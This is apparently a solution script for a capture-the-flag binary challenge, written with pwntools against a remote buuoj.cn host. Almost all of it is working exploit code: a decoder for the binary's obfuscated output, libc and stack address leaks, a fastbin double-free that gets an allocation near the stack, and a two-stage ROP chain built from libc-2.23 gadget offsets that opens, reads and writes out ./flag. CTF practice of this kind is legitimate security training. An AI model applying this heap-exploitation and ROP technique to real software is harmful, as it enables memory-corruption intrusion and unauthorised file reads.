def dec(res):
	v5=[51,18,120,36]
	v9=9
	v7=0x26a77aaa
	while v9>0:  
	    v10 = (v7 >> 2) & 3
	    for i in range(15,-1,-1):
		v6 = res[(i-1+16)%16]
		res[i] -= (((v6 >> 7) ^ 8 * res[(i + 1)%16]) + ((res[(i + 1)%16] >> 2) ^ 32 * v6) - 33) ^ ((res[(i + 1)%16] ^ v7 ^ 0x57)+ (v6 ^ v5[v10 ^ i & 3])+ 63)
		res[i]&=0xff
	    v7 -= 0x76129BDA
	    v7&=0xffffffff
	    v9-=1
from pwn import *

# p = process("./repwn")
libc=ELF('../../x64libc/libc-2.23.so')
p = remote("node4.buuoj.cn",25218)
#context.log_level = 'debug'
def add(size,data):
	p.recvuntil(" choice:")
	p.sendline("1")
	p.recvuntil("how long?")
	p.sendline(str(size))
	p.sendline(data)
def free(idx):
	p.recvuntil(" choice:")
	p.sendline("3")
	p.recvuntil("which one?")
	p.sendline(str(idx))


add(0x68,'aaa')
p.recvuntil(" choice:")

p.sendline("2")
p.send("\n")
rev = p.recv(0x10)
res = []
for i in range(len(rev)):
	res.append(u32(rev[i]+'\x00'*3))
dec(res)
s = ''
for i in range(len(rev)):
	s += chr(res[i])
libc.address = u64(s[:6]+'\x00\x00')-0x5F1A88
print hex(libc.address)

stack = u64(s[8:14]+'\x00\x00')
print hex(stack)
add(0x68,'aaa')#0
add(0x68,'aaa')#1
free(0)
free(1)
free(0)


pop_rdi = 0x0000000000021102 + libc.address
pop_rsi = 0x00000000000202e8 + libc.address
pop_rdx = 0x0000000000001b92 + libc.address
pop_rax = 0x0000000000033544 + libc.address
pop_rsp = 0x0000000000003838 + libc.address
syscall = 0x00000000000bc375 + libc.address

add(0x68,p64(stack - 0xf3))#2
add(0x68,'aaa')#3
add(0x68,'aaa')#4
one = [0x45226,0x4527a,0xf0364,0xf1207]

#gdb.attach(p,'b *'+hex(syscall))
pay = '\x00'*0x3
pay += p64(pop_rdx)
pay += p64(0x100)
pay += p64(pop_rax)
pay += p64(0)
pay += p64(syscall)


pay += p64(pop_rdi)
pay += p64(0)
pay += p64(pop_rsi)
pay += p64(stack-0xe0+5*8+0x10)
pay += p64(pop_rsp)
pay += p64(stack-0xe0)
print hex(len(pay))
add(0x68,pay)#5
payload = ''
payload += p64(pop_rdi)
payload += p64(stack+0x30)
payload += p64(pop_rsi)
payload += p64(4)
payload += p64(pop_rdx)
payload += p64(4)
payload += p64(pop_rax)
payload += p64(2)
payload += p64(syscall)


payload += p64(pop_rdi)
payload += p64(3)
payload += p64(pop_rsi)
payload += p64(stack+0x100)
payload += p64(pop_rdx)
payload += p64(0x100)
payload += p64(pop_rax)
payload += p64(0)
payload += p64(syscall)


payload += p64(pop_rdi)
payload += p64(1)
payload += p64(pop_rsi)
payload += p64(stack+0x100)
payload += p64(pop_rdx)
payload += p64(0x100)
payload += p64(pop_rax)
payload += p64(1)
payload += p64(syscall)
payload += './flag\x00'
sleep(1)
p.sendline(payload+'\n')
p.interactive()
